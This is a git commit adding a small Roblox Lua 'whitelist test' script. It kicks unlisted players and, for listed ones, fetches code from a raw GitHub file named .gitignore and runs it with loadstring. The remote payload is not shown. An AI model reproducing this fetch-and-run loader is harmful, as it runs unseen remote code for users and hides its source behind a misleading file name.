a116775759ec9fe7f8257a1356577169ba5b3752
ruben202 <58440696+ruben202@users.noreply.github.com>
2022-12-19 14:53:01 +0100

    Add files via upload

---
+++ prueba de whitelist.lua
@@ -0,0 +1,16 @@
+whitelist = {"user1", "user2", "user3"}
+game.Players.PlayerAdded:Connect(function(player)
+  -- Aquí puedes poner el código que quieres ejecutar cuando un usuario se une al juego
+end)
+game.Players.PlayerAdded:Connect(function(player)
+  for i, name in ipairs(whitelist) do
+    if name == player.Name then
+      -- El usuario está en la whitelist, así que ejecuta el script aquí
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/JASboy53/NAM-GUI/main/.gitignore"))()
+      return
+    end
+  end
+
+  -- El usuario no está en la whitelist, así que expúlsalo del juego
+  player:Kick("Lo siento, no estás en la whitelist.")
+end)
